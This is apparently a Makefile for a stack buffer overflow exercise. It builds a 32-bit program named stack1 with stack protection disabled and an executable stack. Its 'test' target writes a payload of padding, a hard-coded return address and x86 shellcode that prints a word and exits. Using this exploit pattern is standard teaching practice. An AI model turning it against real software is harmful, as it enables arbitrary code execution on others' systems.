
CC = gcc
CFLAGS = -Wall -g -fno-stack-protector -m32 -Wl,-zexecstack

.PHONY: all

all: stack1

stack1: stack1.c
	$(CC) $(CFLAGS) -o $@ $<

ulimit:
	ulimit -c unlimited
	ulimit unlimited

test:
	perl -e 'printf "A"x48 . "\x90\xd6\xff\xff" . "\x66\x31\xC0\x66\x31\xDB\x66\x31\xC9\x66\x31\xD2\xB3\x01\x66\x83\xC4\x23\x66\x89\xE1\xB2\x05\xB0\x04\xCD\x80\xB0\x01\xB3\x01\xFE\xCB\xCD\x80\x46\x55\x43\x4B\x0A"' > bad.txt ; ./stack1

debug:
	gdb ./stack1 core -q

shellcode:
	nasm -o shell1 shell1.s

ndisasm:
	ndisasm shell1 > shell1.disasm

clean:	
	rm -f stack1 bad.txt core
